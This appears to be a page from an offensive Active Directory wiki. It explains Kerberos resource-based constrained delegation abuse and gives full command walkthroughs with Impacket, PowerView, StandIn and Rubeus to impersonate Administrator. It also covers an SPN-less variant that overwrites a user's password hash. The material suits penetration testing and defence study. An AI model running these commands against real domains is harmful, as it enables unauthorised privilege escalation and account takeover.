# (RBCD) Resource-based constrained

## Theory

If an account, having the capability to edit the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute of another object (e.g. the `GenericWrite` ACE, see [Abusing ACLs](../../dacl/)), is compromised, an attacker can use it populate that attribute, hence configuring that object for RBCD.

{% hint style="success" %}
Machine accounts can edit their own `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute, hence allowing RBCD attacks on relayed machine accounts authentications.
{% endhint %}

For this attack to work, the attacker needs to populate the target attribute with the SID of an account that Kerberos can consider as a service. A service ticket will be asked for it. In short, the account must be either (see [Kerberos tickets](../#tickets) for more information about the following):

* a user account having a `ServicePrincipalName` set
* an account with a trailing `$` in the `sAMAccountName` (i.e. a computer accounts)
* any other account and conduct [SPN-less RBCD](rbcd.md#rbcd-on-spn-less-users) with [U2U (User-to-User) authentication](../#user-to-user-authentication)

The common way to conduct these attacks is to create a computer account. This is usually possible thanks to a domain-level attribute called [`MachineAccountQuota`](../../domain-settings/machineaccountquota.md) that allows regular users to create up to 10 computer accounts.

{% hint style="info" %}
In 2022, [Jame Forshaw](https://twitter.com/tiraniddo) demonstrated that the SPN requirement wasn't completely mandatory and RBCD could be operated without: [Exploiting RBCD using a normal user](https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html). While this technique is a bit trickier and should absolutely be avoided on regular user accounts (the technique renders them unusable for normal people), it allows to abuse RBCD even if the [`MachineAccountQuota`](../../domain-settings/machineaccountquota.md) is set to 0. The technique is demonstrated later on in this page ([RBCD on SPN-less user](rbcd.md#rbcd-on-spn-less-users)).
{% endhint %}

Then, in order to abuse this, the attacker has to control the account (A) the target object's (B) attribute has been populated with. Using that account's (A) credentials, the attacker can obtain a ticket through `S4U2Self` and `S4U2Proxy` requests, just like constrained delegation with protocol transition.

In the end, an RBCD abuse results in a Service Ticket to authenticate on the target service (B) on behalf of a user. Once the final Service Ticket is obtained, it can be used with [Pass-the-Ticket](../ptt.md) to access the target service (B).&#x20;

{% hint style="warning" %}
If the "impersonated" account is "[is sensitive and cannot be delegated](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/how-to-configure-protected-accounts)" or a member of the "[Protected Users](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group)" group, the delegation will (probably) fail.
{% endhint %}

{% hint style="warning" %}
There are a few additional details to keep in mind, valid as of the time of writing this note: Jan. 24th 2023.

* In December 2020, along with [KB4598347](https://support.microsoft.com/en-us/topic/kb4598347-managing-deployment-of-kerberos-s4u-changes-for-cve-2020-17049-569d60b7-3267-e2b0-7d9b-e46d770332ab) patching the [bronze-bit attack](bronze-bit.md) (CVE-2020-17049), Microsoft issued [KB4577252](https://support.microsoft.com/en-us/topic/kb4577252-managing-deployment-of-rbcd-protected-user-changes-for-cve-2020-16996-9a59a49f-20b9-a292-f205-da9da0ff24d3) patching the CVE-2020-16996 vulnerability. While this second CVE has few information and details about it online, some lab testing indicates it may be linked to the verifications made by KDCs when receiving [S4U2proxy `TGS-REQ`](https://learn.microsoft.com/en-us/openspecs/windows\_protocols/ms-sfu/c6f6f8b3-1209-487b-881d-d0908a413bb7) requests.
* Before this patch, some testing indicates that accounts set as "sensitive and cannot be delegated" wouldn't be delegated (intended behavior), but members of the Protected Users group (and without the "sensitive" setting) would be (unintended !).
* As it turns out, even after the patch, as of Jan. 24th 2023, members of the Protected Users group are now in fact protected against delegation, **except** for the native administrator account (RID 500), even if it's a member of the group. No idea if this is intended or not but it seems it's not the only security behavior of that group that doesn't apply for this account (e.g. RC4 pre-authentication still works for the RID-500 admin, even if member of the Protected Users group, source: [Twitter](https://twitter.com/Defte\_/status/1597699988368556032)).
{% endhint %}

{% hint style="success" %}
A technique called [AnySPN or "service class modification"](../ptt.md#modifying-the-spn) can be used concurrently with pass-the-ticket to change the service class the Service Ticket was destined to (e.g. for the `cifs/target.domain.local` SPN, the service class is `cifs`).
{% endhint %}

![](../../../../.gitbook/assets/Kerberos\_delegations-rbcd.png)

{% hint style="info" %}
The `msDS-AllowedToActOnBehalfOfOtherIdentity` was introduced with Windows Server 2012 implying that RBCD only works when the Domain Controller Functionality Level (DCFL) is Windows Server 2012 or higher.
{% endhint %}

## Practice

{% tabs %}
{% tab title="UNIX-like" %}
**1 - Edit the target's "rbcd" attribute (**[**DACL abuse**](../../dacl/)**)** :pencil2: ****&#x20;

[Impacket](https://github.com/SecureAuthCorp/impacket/)'s [rbcd.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/rbcd.py) script (Python) _c_an be used to read, write or clear the delegation rights, using the credentials of a domain user that has the needed permissions.

{% code overflow="wrap" %}
```bash
# Read the attribute
rbcd.py -delegate-to 'target$' -dc-ip 'DomainController' -action 'read' 'domain'/'PowerfulUser':'Password'

# Append value to the msDS-AllowedToActOnBehalfOfOtherIdentity
rbcd.py -delegate-from 'controlledaccount' -delegate-to 'target$' -dc-ip 'DomainController' -action 'write' 'domain'/'PowerfulUser':'Password'
```
{% endcode %}

{% hint style="success" %}
Testers can also use [ntlmrelayx](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) to set the delegation rights with the `--delegate-access` option when conducting this attack from a [relayed authentication](../../ntlm/relay.md).
{% endhint %}

{% hint style="info" %}
In this example, `controlledaccount` can be [a computer account created for the attack](../../domain-settings/machineaccountquota.md#create-a-computer-account), or any other account -with at least one Service Principal Name set for the usual technique, or without for [SPN-less RBCD](rbcd.md#rbcd-on-spn-less-users)- which credentials are known to the attacker.
{% endhint %}

**2 - Obtain a ticket (delegation operation)** :ticket: ****&#x20;

Once the attribute has been modified, the [Impacket](https://github.com/SecureAuthCorp/impacket) script [getST](https://github.com/SecureAuthCorp/impacket/blob/master/examples/getST.py) (Python) can then perform all the necessary steps to obtain the final "impersonating" ST (in this case, "Administrator" is impersonated but it can be any user in the environment).

{% code overflow="wrap" %}
```bash
getST.py -spn 'cifs/target' -impersonate Administrator -dc-ip 'DomainController' 'domain/controlledaccountwithSPN:SomePassword'
```
{% endcode %}

{% hint style="warning" %}
In [some cases](./#theory), the delegation will not work. Depending on the context, the [bronze bit ](../forged-tickets/#bronze-bit-cve-2020-17049)vulnerability (CVE-2020-17049) can be used with the `-force-forwardable` option to try to bypass restrictions.
{% endhint %}

{% hint style="info" %}
The SPN (Service Principal Name) set can have an impact on what services will be reachable. For instance, `cifs/target.domain` or `host/target.domain` will allow most remote dumping operations (more info on [adsecurity.org](https://adsecurity.org/?page\_id=183)). There however scenarios where the SPN can be changed ([AnySPN](../ptt.md#modifying-the-spn)) to access more service. This technique is automatically tried by Impacket scripts when doing pass-the-ticket.
{% endhint %}

**3 - Pass-the-ticket** :passport\_control: ****&#x20;

Once the ticket is obtained, it can be used with [pass-the-ticket](../ptt.md).
{% endtab %}

{% tab title="Windows" %}
In order to run the following commands and tools as other users, testers can check the [user impersonation](../../credentials/impersonation.md) part.

**1 - Edit the target's security descriptor (ACE abuse)**:pencil2: ****&#x20;

The [PowerShell ActiveDirectory module](https://docs.microsoft.com/en-us/powershell/module/addsadministration/?view=win10-ps)'s cmdlets Set-ADComputer and Get-ADComputer can be used to write and read the attributed of an object (in this case, to modify the delegation rights).

```bash
# Read the security descriptor
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount

# Populate the msDS-AllowedToActOnBehalfOfOtherIdentity
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount 'controlledaccountwithSPN'
```

PowerSploit's [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) module is an alternative that can be used to edit the attribute ([source](https://powersploit.readthedocs.io/en/latest/Recon/Set-DomainObject/)).

```bash
# Obtain the SID of the controlled account with SPN (e.g. Computer account)
$ComputerSid = Get-DomainComputer "controlledaccountwithSPN" -Properties objectsid | Select -Expand objectsid

# Build a generic ACE with the attacker-added computer SID as the pricipal, and get the binary bytes for the new DACL/ACE
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)

# set SD in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the target comptuer account
Get-DomainComputer "target$" | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

FuzzSecurity's [StandIn](https://github.com/FuzzySecurity/StandIn) project is another alternative in C# (.NET assembly) to edit the attribute ([source](https://github.com/FuzzySecurity/StandIn#add-msds-allowedtoactonbehalfofotheridentity)).

```powershell
# Obtain the SID of the controlled account with SPN (e.g. Computer account)
StandIn.exe --object samaccountname=controlledaccountwithSPNName

# Add the object to the msDS-AllowedToActOnBehalfOfOtherIdentity of the targeted computer
StandIn.exe --computer "target" --sid "controlledaccountwithSPN's SID"
```

**2 - Obtain a ticket (delegation operation)** :ticket: ****&#x20;

[Rubeus](https://github.com/GhostPack/Rubeus) can then be used to request the TGT and "impersonation ST", and inject it for later use.

```powershell
# Request a TGT for the current user
Rubeus.exe tgtdeleg /nowrap
# OR - Request a TGT for a specific account
Rubeus.exe asktgt /user:"controlledaccountwithSPN" /aes256:$aesKey /nowrap

# Request the "impersonation" service ticket using RC4 Key
Rubeus.exe s4u /nowrap /impersonateuser:"administrator" /msdsspn:"cifs/target" /domain:"domain" /user:"controlledaccountwithSPN" /rc4:$NThash
# OR - Request the "impersonation" service ticket using TGT Ticket of the controlledaccountwithSPN
Rubeus.exe s4u /nowrap /impersonateuser:"administrator" /msdsspn:"host/target" /altservice:cifs,ldap /domain:"domain" /user:"controlledaccountwithSPN" /ticket:$kirbiB64tgt
```

The NT hash and AES keys can be computed as follows.

```powershell
Rubeus.exe hash /password:$password
Rubeus.exe hash /user:$username /domain:"domain.local" /password:$password
```

{% hint style="warning" %}
In [some cases](./#theory), the delegation will not work. Depending on the context, the [bronze bit ](../forged-tickets/#bronze-bit-cve-2020-17049)vulnerability (CVE-2020-17049) can be used with the `/bronzebit` flag to try to bypass restrictions.
{% endhint %}

{% hint style="info" %}
The SPN (Service Principal Name) set can have an impact on what services will be reachable. For instance, `cifs/target.domain` or `host/target.domain` will allow most remote dumping operations (more info on [adsecurity.org](https://adsecurity.org/?page\_id=183)). There however scenarios where the SPN can be changed ([AnySPN](../ptt.md#modifying-the-spn)) to access more service**s**. This technique can be exploited with the `/altservice` flag with Rubeus.
{% endhint %}

**3 - Pass-the-ticket** :passport\_control: ****&#x20;

Once the ticket is injected, it can natively be used when accessing the service (see [pass-the-ticket](../ptt.md)).
{% endtab %}
{% endtabs %}

### RBCD on SPN-less users

In 2022, [Jame Forshaw](https://twitter.com/tiraniddo) demonstrated that the SPN requirement wasn't completely mandatory and RBCD could be operated without: [Exploiting RBCD using a normal user](https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html). While this technique is a bit trickier and should absolutely be avoided on regular user accounts (the technique renders them unusable for normal people), it allows to abuse RBCD even if the [`MachineAccountQuota`](../../domain-settings/machineaccountquota.md) is set to 0. In this case, the first (edit the "rbcd" attribute) and last ("Pass-the-ticket") steps are the same. Only the "Obtain a ticket" step changes.

The technique is as follows:

1. Obtain a TGT for the SPN-less user allowed to delegate to a target and retrieve the TGT session key.
2. Change the user's password hash and set it to the TGT session key.
3. [Combine S4U2self and U2U](../#s4u2self-+-u2u) so that the SPN-less user can obtain a service ticket to itself, on behalf of another (powerful) user, and then proceed to S4U2proxy to obtain a service ticket to the target the user can delegate to, on behalf of the other, more powerful, user.
4. [Pass the ticket](../ptt.md) and access the target, as the delegated other

{% hint style="danger" %}
While this technique allows for an abuse of the RBCD primitive, even when the [`MachineAccountQuota`](../../domain-settings/machineaccountquota.md) is set to 0, or when the absence of LDAPS limits the creation of computer accounts, it requires a sacrificial user account. In the abuse process, the user account's password hash will be reset with another hash that has no known plaintext, effectively preventing regular users from using this account.
{% endhint %}

{% tabs %}
{% tab title="UNIX-like" %}
From UNIX-like systems, [Impacket](https://github.com/SecureAuthCorp/impacket) (Python) scripts can be used to operate that technique. At the time of writing, September 7th 2022, some of the tools used below are in Pull Requests still being reviewed before merge ([#1201](https://github.com/SecureAuthCorp/impacket/pull/1201) and [#1202](https://github.com/SecureAuthCorp/impacket/pull/1202)).

{% code overflow="wrap" %}
```bash
# Obtain a TGT through overpass-the-hash to use RC4
getTGT.py -hashes :$(pypykatz crypto nt 'SomePassword') 'domain'/'controlledaccountwithoutSPN'

# Obtain the TGT session key
describeTicket.py 'TGT.ccache' | grep 'Ticket Session Key'

# Change the controlledaccountwithoutSPN's NT hash with the TGT session key
smbpasswd.py -newhashes :TGTSessionKey 'domain'/'controlledaccountwithoutSPN':'SomePassword'@'DomainController'

# Obtain the delegated service ticket through S4U2self+U2U, followed by S4U2proxy (the steps could be conducted individually with the -self and -additional-ticket flags)
KRB5CCNAME='TGT.ccache' getST.py -u2u -impersonate "Administrator" -spn "host/target.domain.com" -k -no-pass 'domain'/'controlledaccountwithoutSPN'

# The password can then be reset to its old value (or another one if the domain policy forbids it, which is usually the case)
smbpasswd.py -hashes :TGTSessionKey -newhashes :OldNTHash 'domain'/'controlledaccountwithoutSPN'@'DomainController'
```
{% endcode %}

After these steps, the final service ticket can be used with [Pass-the-ticket](../ptt.md).
{% endtab %}

{% tab title="Windows" %}
From Windows systems, [Rubeus](https://github.com/GhostPack/Rubeus) (C#) can be used to operate the technique.

The steps detailed in [PR #137](https://github.com/GhostPack/Rubeus/pull/137) can be followed.

After these steps, the final service ticket can be used with [Pass-the-ticket](../ptt.md).
{% endtab %}
{% endtabs %}

## Resources

{% embed url="https://blog.stealthbits.com/resource-based-constrained-delegation-abuse/" %}

{% embed url="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html" %}

{% embed url="https://www.netspi.com/blog/technical/network-penetration-testing/cve-2020-17049-kerberos-bronze-bit-theory/" %}

{% embed url="https://dirkjanm.io/abusing-forgotten-permissions-on-precreated-computer-objects-in-active-directory/" %}

{% embed url="https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html" %}

{% embed url="https://tttang.com/archive/1617/" %}
